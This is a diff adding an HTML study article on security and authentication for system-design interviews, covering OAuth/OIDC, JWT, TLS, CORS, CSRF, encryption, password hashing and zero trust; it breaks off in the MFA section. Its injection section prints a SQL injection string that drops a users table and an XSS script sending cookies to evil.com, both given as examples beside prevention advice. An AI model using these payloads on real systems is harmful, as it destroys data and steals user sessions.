@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Security and Authentication</title>
+</head>
+<body>
+
+<h1>Security and Authentication</h1>
+<h2>Introduction</h2>
+<p>Security is not a feature you bolt on at the end -- it is a fundamental property that must be woven into every layer of your system architecture. In system design interviews, security questions test whether you understand the difference between authentication and authorization, whether you can reason about threat models, and whether you know the standard protocols that the industry relies on.</p>
+<p>This article covers authentication protocols (OAuth 2.0, OIDC, JWT), transport security (TLS), API security patterns, encryption strategies, and architectural principles like zero trust. These topics come up in nearly every senior-level interview, often as follow-up questions after you present an initial design.</p>
+<div class="note">
+
+<p>Authentication verifies identity (&quot;who are you?&quot;). Authorization determines permissions (&quot;what are you allowed to do?&quot;). Many candidates conflate these. OAuth 2.0, despite being the most widely used protocol, is technically an authorization framework, not an authentication protocol. OIDC adds authentication on top.</p>
+</div>
+
+
+<hr>
+<h2>OAuth 2.0</h2>
+<p>OAuth 2.0 is the industry-standard authorization framework. It allows a user to grant a third-party application limited access to their resources on another service, without sharing their password.</p>
+<h3>Core Concepts</h3>
+<ul>
+<li><strong>Resource Owner:</strong> The user who owns the data (e.g., a Google user)</li>
+<li><strong>Client:</strong> The application requesting access (e.g., a calendar app)</li>
+<li><strong>Authorization Server:</strong> Issues access tokens after authenticating the user (e.g., Google&#39;s OAuth server)</li>
+<li><strong>Resource Server:</strong> Hosts the protected resources (e.g., Google Calendar API)</li>
+<li><strong>Access Token:</strong> A credential the client uses to access resources</li>
+<li><strong>Refresh Token:</strong> A long-lived credential used to obtain new access tokens without re-authentication</li>
+</ul>
+<h3>Authorization Code Flow with PKCE</h3>
+<p>This is the recommended flow for all clients, including mobile apps and single-page applications. PKCE (Proof Key for Code Exchange) adds protection against authorization code interception attacks.</p>
+<pre class="mermaid">
+sequenceDiagram
+    participant User
+    participant App as Client App
+    participant Auth as Authorization Server
+    participant API as Resource Server
+
+    App->>App: Generate code_verifier (random string)
+    App->>App: Compute code_challenge = SHA256(code_verifier)
+
+    App->>Auth: Authorization Request + code_challenge
+    Auth->>User: Login page
+    User->>Auth: Enter credentials + consent
+    Auth->>App: Authorization code (via redirect)
+
+    App->>Auth: Exchange code + code_verifier for tokens
+    Auth->>Auth: Verify SHA256(code_verifier) == code_challenge
+    Auth->>App: Access token + refresh token
+
+    App->>API: Request with access token
+    API->>API: Validate token
+    API->>App: Protected resource
+</pre>
+<p><strong>Step by step:</strong></p>
+<ol>
+<li>The client generates a random <code>code_verifier</code> string and computes its SHA-256 hash as the <code>code_challenge</code></li>
+<li>The client redirects the user to the authorization server with the <code>code_challenge</code></li>
+<li>The user authenticates and grants consent</li>
+<li>The authorization server redirects back to the client with an authorization code</li>
+<li>The client sends the authorization code plus the original <code>code_verifier</code> to the token endpoint</li>
+<li>The authorization server hashes the <code>code_verifier</code> and verifies it matches the <code>code_challenge</code> sent in step 2</li>
+<li>If valid, the server returns an access token and a refresh token</li>
+</ol>
+<p><strong>Why PKCE matters:</strong> Without PKCE, if an attacker intercepts the authorization code (which is sent via URL redirect and can be captured on mobile or via browser history), they could exchange it for tokens. With PKCE, the attacker also needs the <code>code_verifier</code>, which was never transmitted over the redirect.</p>
+<h3>Client Credentials Flow</h3>
+<p>Used for machine-to-machine communication where no user is involved. The client authenticates directly with its own credentials.</p>
+<ol>
+<li>The client sends its <code>client_id</code> and <code>client_secret</code> to the authorization server</li>
+<li>The authorization server validates the credentials and returns an access token</li>
+<li>The client uses the access token to call the resource server</li>
+</ol>
+<p>This flow is used for backend services calling other backend services, cron jobs, and automated processes.</p>
+<h3>Implicit Flow (Deprecated)</h3>
+<p>The implicit flow returned access tokens directly in the URL redirect, without the intermediate authorization code step. This was designed for browser-based apps that couldn&#39;t securely store a client secret.</p>
+<p>It is now deprecated because:</p>
+<ul>
+<li>Tokens in URLs are visible in browser history, referrer headers, and server logs</li>
+<li>No refresh tokens (the spec forbids them in implicit flow)</li>
+<li>Authorization code flow with PKCE is now secure enough for browser apps</li>
+</ul>
+<div class="warning">
+
+<p>If an interviewer asks about implicit flow, mention that it is deprecated and explain why. Then describe authorization code flow with PKCE as the replacement. This shows current knowledge.</p>
+</div>
+
+
+<h3>Refresh Token Rotation</h3>
+<p>Access tokens are short-lived (typically 15-60 minutes). Refresh tokens are longer-lived and used to get new access tokens without requiring the user to log in again.</p>
+<p><strong>Refresh token rotation</strong> means that every time a refresh token is used, the server issues a new refresh token and invalidates the old one. If an attacker steals a refresh token and uses it, the legitimate client&#39;s next refresh request will fail (because their token was invalidated), alerting the system to the compromise.</p>
+<hr>
+<h2>OpenID Connect (OIDC)</h2>
+<p>OIDC is an authentication layer built on top of OAuth 2.0. While OAuth 2.0 tells you what a user is authorized to access, OIDC tells you who the user is.</p>
+<h3>What OIDC Adds</h3>
+<ul>
+<li><strong>ID Token:</strong> A JWT containing user identity claims (name, email, subject ID)</li>
+<li><strong>UserInfo Endpoint:</strong> An API to fetch additional user profile information</li>
+<li><strong>Standard Scopes:</strong> <code>openid</code> (required), <code>profile</code>, <code>email</code>, <code>address</code>, <code>phone</code></li>
+<li><strong>Discovery:</strong> A <code>.well-known/openid-configuration</code> endpoint for auto-configuration</li>
+</ul>
+<h3>How It Differs from Plain OAuth</h3>
+<table>
+<thead>
+<tr>
+<th>Aspect</th>
+<th>OAuth 2.0</th>
+<th>OIDC</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Purpose</td>
+<td>Authorization</td>
+<td>Authentication + Authorization</td>
+</tr>
+<tr>
+<td>Token type</td>
+<td>Access token</td>
+<td>Access token + ID token</td>
+</tr>
+<tr>
+<td>User identity</td>
+<td>Not standardized</td>
+<td>Standardized in ID token</td>
+</tr>
+<tr>
+<td>Scopes</td>
+<td>Application-defined</td>
+<td>Standardized (openid, profile, email)</td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>No standard</td>
+<td>.well-known endpoint</td>
+</tr>
+</tbody></table>
+<div class="tip">
+
+<p>In interviews, when discussing user login, say &quot;we&#39;ll use OIDC for authentication.&quot; If asked to clarify, explain that OIDC gives us a standardized ID token with user identity, while OAuth 2.0 alone only gives us an access token that authorizes API calls but doesn&#39;t tell us who the user is.</p>
+</div>
+
+
+<hr>
+<h2>JSON Web Tokens (JWT)</h2>
+<p>JWTs are the standard token format used by OAuth 2.0 and OIDC. Understanding their structure and security properties is essential.</p>
+<h3>Structure</h3>
+<p>A JWT consists of three Base64URL-encoded parts separated by dots:</p>
+<pre><code>header.payload.signature
+</code></pre>
+<p><strong>Header:</strong></p>
+<pre><code class="language-json">{
+  &quot;alg&quot;: &quot;RS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+}
+</code></pre>
+<p><strong>Payload (Claims):</strong></p>
+<pre><code class="language-json">{
+  &quot;sub&quot;: &quot;user_123&quot;,
+  &quot;name&quot;: &quot;Alice&quot;,
+  &quot;email&quot;: &quot;alice@example.com&quot;,
+  &quot;iat&quot;: 1609459200,
+  &quot;exp&quot;: 1609462800,
+  &quot;iss&quot;: &quot;https://auth.example.com&quot;,
+  &quot;aud&quot;: &quot;my-app&quot;
+}
+</code></pre>
+<p><strong>Signature:</strong></p>
+<pre><code>RS256(base64url(header) + &quot;.&quot; + base64url(payload), private_key)
+</code></pre>
+<h3>Signing Algorithms</h3>
+<table>
+<thead>
+<tr>
+<th>Algorithm</th>
+<th>Type</th>
+<th>Key</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HS256</td>
+<td>Symmetric</td>
+<td>Shared secret</td>
+<td>Single service validates its own tokens</td>
+</tr>
+<tr>
+<td>RS256</td>
+<td>Asymmetric</td>
+<td>RSA private/public key pair</td>
+<td>Authorization server signs, multiple services verify</td>
+</tr>
+<tr>
+<td>ES256</td>
+<td>Asymmetric</td>
+<td>ECDSA key pair</td>
+<td>Same as RS256, smaller keys, faster</td>
+</tr>
+</tbody></table>
+<p><strong>HS256 vs RS256:</strong></p>
+<ul>
+<li>HS256 uses one shared secret for both signing and verification. Every service that needs to verify tokens must have the secret, which increases the attack surface.</li>
+<li>RS256 uses a private key (kept secret on the auth server) to sign and a public key (freely distributed) to verify. Services only need the public key, which can&#39;t be used to forge tokens.</li>
+</ul>
+<div class="important">
+
+<p>In production, always prefer RS256 or ES256 over HS256. The asymmetric approach means your resource servers never have access to the signing key, so a compromised resource server can&#39;t forge tokens.</p>
+</div>
+
+
+<h3>Token Verification Flow</h3>
+<p>When a resource server receives a request with a JWT:</p>
+<ol>
+<li>Decode the header (no cryptographic operation needed, it&#39;s just Base64)</li>
+<li>Fetch the authorization server&#39;s public key (usually cached, obtained from a JWKS endpoint)</li>
+<li>Verify the signature using the public key</li>
+<li>Check the <code>exp</code> claim -- reject if the token is expired</li>
+<li>Check the <code>iss</code> claim -- reject if the issuer is unexpected</li>
+<li>Check the <code>aud</code> claim -- reject if the token wasn&#39;t intended for this service</li>
+<li>Extract the claims and proceed with authorization</li>
+</ol>
+<h3>Token Expiration and Refresh</h3>
+<ul>
+<li><strong>Access tokens:</strong> Short-lived (15-60 minutes). Limits the window of damage if stolen.</li>
+<li><strong>Refresh tokens:</strong> Longer-lived (days to weeks). Stored securely (HTTP-only cookies or secure storage). Used to get new access tokens.</li>
+<li><strong>ID tokens:</strong> Short-lived. Used only for initial identity verification, not for ongoing API access.</li>
+</ul>
+<div class="warning">
+
+<p>JWTs are not encrypted by default -- they are only signed. The payload is Base64-encoded, which is trivially decoded. Never put sensitive data (passwords, credit card numbers) in JWT claims. Anyone who intercepts the token can read the payload. Use JWE (JSON Web Encryption) if you need encrypted tokens.</p>
+</div>
+
+
+<hr>
+<h2>Single Sign-On (SSO)</h2>
+<p>SSO allows users to authenticate once and access multiple applications without re-entering credentials.</p>
+<h3>SAML-Based SSO</h3>
+<p>SAML (Security Assertion Markup Language) is an older XML-based standard for SSO, common in enterprise environments.</p>
+<ol>
+<li>User tries to access Application A</li>
+<li>Application A redirects to the Identity Provider (IdP)</li>
+<li>User authenticates with the IdP</li>
+<li>IdP returns a SAML assertion (XML document with identity claims)</li>
+<li>User accesses Application B</li>
+<li>Application B redirects to the same IdP</li>
+<li>IdP recognizes the existing session and returns a SAML assertion without requiring login</li>
+</ol>
+<h3>OAuth/OIDC-Based SSO</h3>
+<p>Modern SSO typically uses OIDC:</p>
+<ol>
+<li>User tries to access Application A</li>
+<li>Application A redirects to the OIDC provider</li>
+<li>User authenticates and receives an ID token + access token</li>
+<li>User accesses Application B</li>
+<li>Application B redirects to the same OIDC provider</li>
+<li>The provider&#39;s session cookie is still valid, so the user is authenticated without login</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>Factor</th>
+<th>SAML</th>
+<th>OIDC</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Format</td>
+<td>XML</td>
+<td>JSON</td>
+</tr>
+<tr>
+<td>Token type</td>
+<td>SAML Assertion</td>
+<td>JWT</td>
+</tr>
+<tr>
+<td>Transport</td>
+<td>HTTP POST, SOAP</td>
+<td>HTTP, REST</td>
+</tr>
+<tr>
+<td>Complexity</td>
+<td>Higher</td>
+<td>Lower</td>
+</tr>
+<tr>
+<td>Mobile friendly</td>
+<td>Poor</td>
+<td>Good</td>
+</tr>
+<tr>
+<td>Adoption trend</td>
+<td>Legacy, enterprise</td>
+<td>Modern, growing</td>
+</tr>
+</tbody></table>
+<div class="tip">
+
+<p>In interviews, if designing a system that needs SSO, default to OIDC unless the requirement specifically mentions enterprise SAML integration. Most modern systems use OIDC, and it is simpler to implement and more mobile-friendly.</p>
+</div>
+
+
+<hr>
+<h2>TLS/SSL</h2>
+<p>Transport Layer Security (TLS) encrypts communication between clients and servers. SSL is the predecessor to TLS and is effectively deprecated, but the terms are often used interchangeably.</p>
+<h3>The TLS Handshake</h3>
+<pre class="mermaid">
+sequenceDiagram
+    participant C as Client
+    participant S as Server
+
+    C->>S: ClientHello (supported cipher suites, TLS version, random)
+    S->>C: ServerHello (chosen cipher suite, TLS version, random)
+    S->>C: Server Certificate (X.509 cert with public key)
+    S->>C: ServerHelloDone
+
+    C->>C: Verify certificate against trusted CAs
+    C->>C: Generate pre-master secret
+    C->>S: ClientKeyExchange (pre-master secret encrypted with server's public key)
+
+    Note over C,S: Both derive session keys from pre-master secret + randoms
+
+    C->>S: ChangeCipherSpec (switching to encrypted)
+    C->>S: Finished (encrypted verification)
+    S->>C: ChangeCipherSpec
+    S->>C: Finished (encrypted verification)
+
+    Note over C,S: All subsequent communication is encrypted with session keys
+</pre>
+<p><strong>Step by step:</strong></p>
+<ol>
+<li><strong>ClientHello:</strong> Client sends supported cipher suites, TLS version, and a random number</li>
+<li><strong>ServerHello:</strong> Server chooses a cipher suite and sends its random number</li>
+<li><strong>Certificate:</strong> Server sends its X.509 certificate containing its public key</li>
+<li><strong>Certificate verification:</strong> Client checks that the certificate is signed by a trusted Certificate Authority (CA), is not expired, and matches the domain</li>
+<li><strong>Key exchange:</strong> Client generates a pre-master secret, encrypts it with the server&#39;s public key, and sends it</li>
+<li><strong>Session keys:</strong> Both sides derive symmetric session keys from the pre-master secret and the random numbers</li>
+<li><strong>Encrypted communication:</strong> All subsequent data is encrypted with the symmetric session keys</li>
+</ol>
+<h3>Certificates and Certificate Authorities</h3>
+<ul>
+<li><strong>Certificate Authority (CA):</strong> A trusted entity that signs server certificates (e.g., Let&#39;s Encrypt, DigiCert)</li>
+<li><strong>Certificate chain:</strong> Server cert -&gt; Intermediate CA -&gt; Root CA. The client trusts root CAs built into the OS/browser</li>
+<li><strong>Certificate pinning:</strong> The client only accepts specific certificates or public keys, rejecting even valid certificates from unexpected CAs. Used in mobile apps for extra security</li>
+</ul>
+<h3>Mutual TLS (mTLS)</h3>
+<p>In standard TLS, only the server presents a certificate. In mTLS, the client also presents a certificate, allowing the server to verify the client&#39;s identity.</p>
+<p><strong>Use case:</strong> Service-to-service communication in microservices. Instead of using API keys or tokens between internal services, mTLS provides strong mutual authentication at the transport layer.</p>
+<p><strong>How it works:</strong> The same handshake as standard TLS, but the server also sends a CertificateRequest, and the client responds with its own certificate. Both sides verify each other&#39;s certificates.</p>
+<div class="note">
+
+<p>mTLS is commonly used in service meshes (Istio, Linkerd) where a sidecar proxy handles certificate management automatically. This means application code doesn&#39;t need to manage certificates -- the infrastructure layer handles it transparently.</p>
+</div>
+
+
+<hr>
+<h2>API Security</h2>
+<h3>CORS (Cross-Origin Resource Sharing)</h3>
+<p>CORS is a browser security mechanism that restricts web pages from making requests to a different domain than the one that served the page.</p>
+<p><strong>What it prevents:</strong> A malicious website at evil.com making API calls to bank.com using the user&#39;s cookies. Without CORS, the browser would attach the user&#39;s bank.com cookies to the request automatically.</p>
+<p><strong>How it works:</strong></p>
+<ol>
+<li>Browser sends an OPTIONS preflight request with <code>Origin: evil.com</code></li>
+<li>Server responds with <code>Access-Control-Allow-Origin: app.bank.com</code> (not evil.com)</li>
+<li>Browser blocks the request because the origin is not allowed</li>
+</ol>
+<p><strong>Key headers:</strong></p>
+<ul>
+<li><code>Access-Control-Allow-Origin</code>: Which origins can access the resource</li>
+<li><code>Access-Control-Allow-Methods</code>: Which HTTP methods are allowed</li>
+<li><code>Access-Control-Allow-Headers</code>: Which headers can be sent</li>
+<li><code>Access-Control-Allow-Credentials</code>: Whether cookies can be included</li>
+</ul>
+<div class="warning">
+
+<p>Never set <code>Access-Control-Allow-Origin: *</code> on endpoints that use cookies or bearer tokens for authentication. This effectively disables CORS protection. Always whitelist specific trusted origins.</p>
+</div>
+
+
+<h3>CSRF (Cross-Site Request Forgery)</h3>
+<p>CSRF attacks trick a user&#39;s browser into making unwanted requests to a site where the user is authenticated.</p>
+<p><strong>Attack scenario:</strong></p>
+<ol>
+<li>User is logged into bank.com (has session cookie)</li>
+<li>User visits evil.com</li>
+<li>Evil.com has a hidden form that posts to bank.com/transfer</li>
+<li>The browser automatically attaches the bank.com session cookie</li>
+<li>The bank processes the transfer as if the user initiated it</li>
+</ol>
+<p><strong>Prevention:</strong></p>
+<ul>
+<li><strong>CSRF tokens:</strong> Server generates a unique token per session/request, embeds it in forms. Requests without a valid token are rejected. The attacker&#39;s page can&#39;t read the token due to same-origin policy.</li>
+<li><strong>SameSite cookies:</strong> Set <code>SameSite=Strict</code> or <code>SameSite=Lax</code> on cookies so the browser doesn&#39;t send them with cross-origin requests.</li>
+<li><strong>Check Origin/Referer headers:</strong> Verify that the request originates from your domain.</li>
+</ul>
+<h3>Input Validation and Injection Attacks</h3>
+<p><strong>SQL Injection:</strong>
+An attacker sends malicious SQL through user input:</p>
+<pre><code>Username: &#39; OR &#39;1&#39;=&#39;1&#39;; DROP TABLE users; --
+</code></pre>
+<p><strong>Prevention:</strong> Use parameterized queries (prepared statements). Never concatenate user input into SQL strings.</p>
+<p><strong>XSS (Cross-Site Scripting):</strong>
+An attacker injects malicious JavaScript that executes in other users&#39; browsers:</p>
+<pre><code>Comment: &lt;script&gt;document.location=&#39;https://evil.com/steal?cookie=&#39;+document.cookie&lt;/script&gt;
+</code></pre>
+<p><strong>Prevention:</strong></p>
+<ul>
+<li>Encode all output (HTML entity encoding)</li>
+<li>Use Content Security Policy (CSP) headers to restrict script sources</li>
+<li>Sanitize HTML input using a whitelist-based sanitizer</li>
+<li>Use HTTP-only cookies so JavaScript can&#39;t access session tokens</li>
+</ul>
+<hr>
+<h2>Encryption</h2>
+<h3>Encryption at Rest</h3>
+<p>Data stored on disk is vulnerable if the storage is compromised (stolen hard drive, cloud storage misconfiguration).</p>
+<ul>
+<li><strong>AES-256:</strong> The standard symmetric encryption algorithm for data at rest. 256-bit key size provides strong protection.</li>
+<li><strong>Full-disk encryption:</strong> Encrypts the entire disk (e.g., LUKS, BitLocker)</li>
+<li><strong>Column-level encryption:</strong> Encrypt specific sensitive columns in a database (SSN, credit card numbers) while leaving non-sensitive data unencrypted for queryability</li>
+<li><strong>Cloud KMS integration:</strong> AWS KMS, GCP Cloud KMS, Azure Key Vault manage encryption keys and encrypt/decrypt data</li>
+</ul>
+<h3>Encryption in Transit</h3>
+<p>Data moving over the network is vulnerable to interception (man-in-the-middle attacks).</p>
+<ul>
+<li><strong>TLS:</strong> Encrypts all data between client and server (covered above)</li>
+<li><strong>Internal traffic:</strong> Use mTLS or encrypted overlay networks between services</li>
+<li><strong>VPN tunnels:</strong> Encrypt traffic between data centers</li>
+</ul>
+<h3>End-to-End Encryption (E2EE)</h3>
+<p>In E2EE, data is encrypted on the sender&#39;s device and only decrypted on the recipient&#39;s device. The server that relays the data never has access to the plaintext.</p>
+<p><strong>The Signal Protocol concept:</strong></p>
+<ol>
+<li>Each user generates a long-term identity key pair and a set of one-time pre-keys</li>
+<li>To start a conversation, the sender uses the recipient&#39;s public pre-keys to derive a shared secret (X3DH key agreement)</li>
+<li>Messages are encrypted with the shared secret using a ratcheting mechanism that generates new keys for each message (Double Ratchet)</li>
+<li>Even if one message key is compromised, past messages remain secure (forward secrecy)</li>
+</ol>
+<div class="tip">
+
+<p>In interviews for messaging systems, always mention E2EE as an option. Explain the tradeoff: E2EE means the server can&#39;t search or moderate message content, which impacts features like server-side search and spam detection.</p>
+</div>
+
+
+<hr>
+<h2>Key Management</h2>
+<p>Encryption is only as strong as the protection of the keys. A system with AES-256 encryption whose keys are stored in a plaintext config file is effectively unencrypted.</p>
+<h3>KMS (Key Management Service)</h3>
+<p>A dedicated service for managing encryption keys:</p>
+<ul>
+<li>Generates keys using hardware random number generators</li>
+<li>Stores keys in tamper-resistant hardware (HSMs -- Hardware Security Modules)</li>
+<li>Provides encrypt/decrypt APIs so application code never sees raw key material</li>
+<li>Logs all key access for auditing</li>
+</ul>
+<h3>DEK/KEK Pattern (Envelope Encryption)</h3>
+<ul>
+<li><strong>DEK (Data Encryption Key):</strong> Encrypts the actual data. Each object/record gets its own DEK.</li>
+<li><strong>KEK (Key Encryption Key):</strong> Encrypts the DEKs. Stored in KMS, never leaves the HSM.</li>
+</ul>
+<p><strong>How it works:</strong></p>
+<ol>
+<li>When encrypting data, generate a new DEK</li>
+<li>Encrypt the data with the DEK</li>
+<li>Encrypt the DEK with the KEK (via KMS API call)</li>
+<li>Store the encrypted data alongside the encrypted DEK</li>
+<li>Discard the plaintext DEK from memory</li>
+</ol>
+<p><strong>Why this pattern:</strong> You can rotate the KEK without re-encrypting all data. You only need to decrypt each DEK with the old KEK and re-encrypt it with the new KEK. The actual data stays untouched.</p>
+<h3>Key Rotation</h3>
+<p>Keys should be rotated regularly (e.g., every 90 days) to limit the window of exposure if a key is compromised. With envelope encryption, rotation is efficient:</p>
+<ol>
+<li>Generate a new KEK version in KMS</li>
+<li>New data uses the new KEK version</li>
+<li>Old data continues to work because the old KEK version is retained (but marked inactive)</li>
+<li>Optionally, re-encrypt old DEKs with the new KEK during a background migration</li>
+</ol>
+<hr>
+<h2>Password Storage</h2>
+<p>Storing passwords correctly is a fundamental security requirement. Getting it wrong leads to catastrophic breaches.</p>
+<h3>Why Not SHA or MD5</h3>
+<ul>
+<li><strong>No salt:</strong> Identical passwords produce identical hashes, enabling rainbow table attacks (precomputed hash lookup tables)</li>
+<li><strong>Too fast:</strong> SHA-256 can compute billions of hashes per second on a GPU. Attackers can brute-force entire password databases quickly</li>
+<li><strong>Not designed for passwords:</strong> General-purpose hash functions are designed to be fast. Password hashing needs to be deliberately slow.</li>
+</ul>
+<h3>Proper Password Hashing</h3>
+<table>
+<thead>
+<tr>
+<th>Algorithm</th>
+<th>Description</th>
+<th>Recommended</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bcrypt</td>
+<td>Based on Blowfish cipher, configurable cost factor</td>
+<td>Yes (widely supported)</td>
+</tr>
+<tr>
+<td>scrypt</td>
+<td>Memory-hard, resistant to ASIC attacks</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Argon2</td>
+<td>Winner of Password Hashing Competition (2015), memory + time configurable</td>
+<td>Yes (modern best choice)</td>
+</tr>
+</tbody></table>
+<p><strong>Key properties:</strong></p>
+<ul>
+<li><strong>Salting:</strong> Each password gets a unique random salt, stored alongside the hash. Even identical passwords produce different hashes. This defeats rainbow tables and prevents attackers from seeing which users share the same password.</li>
+<li><strong>Cost factor:</strong> Controls how slow the hashing is. Increase it as hardware gets faster (bcrypt cost 12 in 2020, consider 13-14 in 2025+).</li>
+<li><strong>Memory hardness (scrypt, Argon2):</strong> Requires significant memory to compute, making GPU/ASIC-based attacks much more expensive.</li>
+</ul>
+<div class="important">
+
+<p>Never implement your own password hashing. Use a well-tested library (e.g., bcrypt in any language). Password storage is one area where &quot;not invented here&quot; syndrome causes real security breaches.</p>
+</div>
+
+
+<hr>
+<h2>Principle of Least Privilege</h2>
+<p>Every user, process, and service should have only the minimum permissions necessary to perform its function. Nothing more.</p>
+<p><strong>Applications in system design:</strong></p>
+<ul>
+<li><strong>Database accounts:</strong> The API server&#39;s database user has SELECT/INSERT/UPDATE on application tables only. It cannot DROP tables, access other schemas, or modify permissions.</li>
+<li><strong>Service accounts:</strong> Each microservice has its own credentials with access only to the resources it needs. The order service can&#39;t read user passwords; the user service can&#39;t modify orders.</li>
+<li><strong>IAM policies:</strong> Cloud IAM roles are scoped to specific resources and actions. An EC2 instance running a thumbnail generator gets S3:GetObject and S3:PutObject on one bucket, not full S3 access.</li>
+<li><strong>Network policies:</strong> Microservices can only communicate with their direct dependencies. The payment service can reach the bank API but not the analytics database.</li>
+</ul>
+<div class="tip">
+
+<p>In interviews, when designing any system, briefly mention that each component should have least-privilege access. It takes 5 seconds to say and demonstrates security awareness.</p>
+</div>
+
+
+<hr>
+<h2>Zero Trust Architecture</h2>
+<p>Traditional security follows a &quot;castle and moat&quot; model: everything outside the network perimeter is untrusted, everything inside is trusted. Zero trust eliminates this assumption.</p>
+<h3>Core Principles</h3>
+<p><strong>&quot;Never trust, always verify&quot;:</strong></p>
+<ul>
+<li>Every request is authenticated and authorized, regardless of network location</li>
+<li>A request from inside the corporate network is treated with the same suspicion as one from the public internet</li>
+<li>Network location is not a factor in access decisions</li>
+</ul>
+<h3>BeyondCorp (Google&#39;s Implementation)</h3>
+<p>Google pioneered zero trust with BeyondCorp after the 2009 Aurora attacks:</p>
+<ol>
+<li><strong>No VPN:</strong> Employees access internal applications through a public-facing proxy, not a VPN</li>
+<li><strong>Device trust:</strong> The device&#39;s health, patch level, and enrollment status are verified</li>
+<li><strong>User identity:</strong> Strong authentication (MFA) is required for every access</li>
+<li><strong>Context-aware access:</strong> Decisions are based on user identity + device trust + request context, not network location</li>
+<li><strong>Continuous verification:</strong> Trust is reassessed continuously, not just at login time</li>
+</ol>
+<h3>Zero Trust in Microservices</h3>
+<ul>
+<li><strong>mTLS everywhere:</strong> Every service-to-service call is encrypted and authenticated</li>
+<li><strong>Service identity:</strong> Each service has a cryptographic identity (SPIFFE/SPIRE)</li>
+<li><strong>Per-request authorization:</strong> Every API call is authorized against a policy engine, not just at the service boundary</li>
+<li><strong>No implicit trust:</strong> Services in the same Kubernetes namespace do not automatically trust each other</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Traditional</th>
+<th>Zero Trust</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Trust internal network</td>
+<td>Trust nothing by default</td>
+</tr>
+<tr>
+<td>VPN for remote access</td>
+<td>Identity-aware proxy</td>
+</tr>
+<tr>
+<td>Perimeter firewall is primary defense</td>
+<td>Identity and context are primary defense</td>
+</tr>
+<tr>
+<td>Flat internal network</td>
+<td>Micro-segmented network</td>
+</tr>
+<tr>
+<td>One-time authentication</td>
+<td>Continuous verification</td>
+</tr>
+</tbody></table>
+<div class="note">
+
+<p>Zero trust is a journey, not a product you can buy. Most organizations adopt it incrementally: start with strong identity (MFA), add device trust, implement mTLS between services, and gradually remove implicit network-based trust.</p>
+</div>
+
+
+<hr>
+<h2>Putting Security Layers Together</h2>
+<p>Security is defense in depth -- no single mechanism is sufficient. A well-secured system layers multiple controls:</p>
+<pre class="mermaid">
+flowchart TD
+    Client[Client] --> WAF[Web Application Firewall<br/>DDoS protection, IP blocking]
+    WAF --> TLS[TLS Termination<br/>Encrypt in transit]
+    TLS --> CORS_CHECK[CORS / CSRF Validation<br/>Block cross-origin attacks]
+    CORS_CHECK --> AUTH[Authentication<br/>OAuth 2.0 / OIDC / JWT]
+    AUTH --> AUTHZ[Authorization<br/>RBAC / ABAC / Policy Engine]
+    AUTHZ --> INPUT[Input Validation<br/>SQL injection, XSS prevention]
+    INPUT --> APP[Application Logic<br/>Least privilege, bulkhead isolation]
+    APP --> ENC[Data Layer<br/>Encryption at rest, key management]
+
+    style WAF fill:#ffcdd2,stroke:#c62828
+    style TLS fill:#fff9c4,stroke:#f9a825
+    style AUTH fill:#c8e6c9,stroke:#2e7d32
+    style ENC fill:#bbdefb,stroke:#1565c0
+</pre>
+<p><strong>Layer-by-layer:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Mechanism</th>
+<th>Threat Mitigated</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Network perimeter</td>
+<td>WAF, rate limiting, geo-blocking</td>
+<td>DDoS, automated attacks</td>
+</tr>
+<tr>
+<td>Transport</td>
+<td>TLS 1.3, certificate pinning</td>
+<td>Eavesdropping, MITM</td>
+</tr>
+<tr>
+<td>Browser</td>
+<td>CORS, CSP, SameSite cookies</td>
+<td>XSS, CSRF, clickjacking</td>
+</tr>
+<tr>
+<td>Identity</td>
+<td>OAuth 2.0 + OIDC, MFA</td>
+<td>Credential theft, impersonation</td>
+</tr>
+<tr>
+<td>Authorization</td>
+<td>RBAC, policy engine, least privilege</td>
+<td>Privilege escalation, unauthorized access</td>
+</tr>
+<tr>
+<td>Input</td>
+<td>Parameterized queries, validation, sanitization</td>
+<td>Injection attacks</td>
+</tr>
+<tr>
+<td>Data</td>
+<td>AES-256, envelope encryption, KMS</td>
+<td>Data breach, storage compromise</td>
+</tr>
+<tr>
+<td>Audit</td>
+<td>Structured logging, access logs, anomaly detection</td>
+<td>Undetected breaches, compliance</td>
+</tr>
+</tbody></table>
+<h3>RBAC vs ABAC</h3>
+<p>Two major authorization models appear in system design:</p>
+<p><strong>RBAC (Role-Based Access Control):</strong> Users are assigned roles (admin, editor, viewer), and roles have permissions. Simple to implement and reason about.</p>
+<p><strong>ABAC (Attribute-Based Access Control):</strong> Access decisions are based on attributes of the user, the resource, and the context. &quot;Allow access if user.department == resource.department AND time is between 9AM-5PM.&quot; More flexible but more complex.</p>
+<table>
+<thead>
+<tr>
+<th>Factor</th>
+<th>RBAC</th>
+<th>ABAC</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Complexity</td>
+<td>Simple</td>
+<td>Complex</td>
+</tr>
+<tr>
+<td>Flexibility</td>
+<td>Limited</td>
+<td>Highly flexible</td>
+</tr>
+<tr>
+<td>Scalability</td>
+<td>Role explosion with many combinations</td>
+<td>Scales with policy rules</td>
+</tr>
+<tr>
+<td>Audit</td>
+<td>Easy to audit who has what role</td>
+<td>Harder to reason about all possible access paths</td>
+</tr>
+<tr>
+<td>Best for</td>
+<td>Most applications</td>
+<td>Multi-tenant, fine-grained access requirements</td>
+</tr>
+</tbody></table>
+<h3>Multi-Factor Authentication (MFA)</h3>
+<p>MFA requires two or more independent authentication factors:</p>
+<ol>
+<li><strong>Something you know:</strong> Password, PIN</li>
+<li><strong>Something you have:</strong> Phone (TOTP app), hardware key (YubiKey)</li>
+<li><strong>Something you are:</strong> Fingerprint, face recognition</li>
+</ol>
+<p><strong>TOTP (Time-Based One-Time Password):</strong></p>
+<ul>
+<li>Server and client share a secret key during MFA setup</li>
+<li>Both generate a 6-digit code using HMAC-SHA1(secret, floor(time/30))</li>
